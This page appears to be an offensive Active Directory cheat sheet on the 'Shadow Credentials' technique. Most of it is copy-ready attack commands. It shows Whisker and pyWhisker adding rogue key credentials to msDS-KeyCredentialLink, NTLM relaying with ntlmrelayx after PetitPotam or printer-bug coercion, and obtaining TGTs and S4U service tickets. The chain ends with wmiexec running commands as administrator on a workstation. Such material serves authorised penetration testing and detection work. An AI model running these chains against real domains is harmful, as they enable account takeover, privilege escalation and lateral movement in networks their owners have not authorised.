# Password - Shadow Credentials

> Add **Key Credentials** to the attribute `msDS-KeyCredentialLink` of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user.  When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.

:warning: User objects can't edit their own `msDS-KeyCredentialLink` attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists

**Requirements**:

* Domain Controller on (at least) Windows Server 2016
* Domain must have Active Directory `Certificate Services` and `Certificate Authority` configured
* PKINIT Kerberos authentication
* An account with the delegated rights to write to the `msDS-KeyCredentialLink` attribute of the target object

**Exploitation**: 

- From Windows, use [Whisker](https://github.com/eladshamir/Whisker):
  ```powershell
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  Whisker.exe list /target:computername$
  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
  Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
  # Removes a key credential from the target object specified by a DeviceID GUID.
  Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
  ```

- From Linux, use [pyWhisker](https://github.com/ShutdownRepo/pyWhisker):
  ```bash
  # Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
  # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
  pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
  # Removes a key credential from the target object specified by a DeviceID GUID.
  python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
  ```

**Scenario**:

- **Scenario 1**: Shadow Credential relaying
  - Trigger an NTLM authentication from `DC01` (PetitPotam)
  - Relay it to `DC02` (ntlmrelayx)
  - Edit `DC01`'s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker)
  - Alternatively : `ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'`

- **Scenario 2**: Workstation Takeover with RBCD
  ```ps1
  # Only for C2: Add Reverse Port Forward from 8081 to Team Server 81

  # Set up ntlmrelayx to relay authentication from target workstation to DC 
  proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\$ --http-port 81

  # Execute printer bug to trigger authentication from target workstation 
  proxychains python3 printerbug.py ez.lab/matt:Password1\!@ws2.ez.lab ws1@8081/file

  # Get a TGT using the newly acquired certificate via PKINIT 
  proxychains python3 gettgtpkinit.py ez.lab/ws2\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR

  # Get a ST (service ticket) for the target account 
  proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\ws2\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v

  # Utilize the ST for future activity 
  export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache
  proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab
  ```


## References

* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)